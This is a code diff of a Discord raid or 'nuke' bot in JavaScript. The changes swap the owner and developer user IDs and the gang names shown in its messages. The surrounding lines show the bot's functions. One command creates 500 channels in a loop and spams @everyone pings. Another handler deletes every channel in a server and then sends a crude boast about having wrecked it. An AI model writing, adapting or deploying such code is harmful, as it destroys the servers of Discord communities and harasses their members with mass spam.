@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __**Atlantic Team join us **__ :muscle: :v: @here');
+        message.channel.send('@everyone __** Luca join us **__ :muscle: :v: @here');
 }
 }
 });   
@@ -27,7 +27,7 @@ for (let i = 0; i < 500; i++) {
 
   client.on('message',async message => {
     if(message.content.startsWith("dm restart")) {
-          if(message.author.id !== "444339372884754435") return message.reply('You aren\'t the bot owner.');
+          if(message.author.id !== "486097529361006594") return message.reply('You aren\'t the bot owner.');
         message.channel.send('**Restarting.**').then(msg => {
             setTimeout(() => {
                msg.edit('**Restarting..**');
@@ -55,7 +55,7 @@ client.on('message' , async (message) => {
 });
 
 
-const developers = ["444339372884754435","412302921972056066",]
+const developers = ["486097529361006594"]
 const adminprefix = "#";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
@@ -96,7 +96,7 @@ client.on('message', x5bz => {
         x5bz.guild.channels.forEach(c => { c.delete() })
                    let v5bz = new Discord.RichEmbed()
                .setColor('RANDOM')
-               .setDescription('**Done sir ! i have been FUCKED THE SERVER ATLATNTIC GANG :cop:**')
+               .setDescription('**Done sir ! i have been FUCKED THE SERVER Luca Changretta :cop:**')
               x5bz.author.sendEmbed(v5bz);
     }
     });
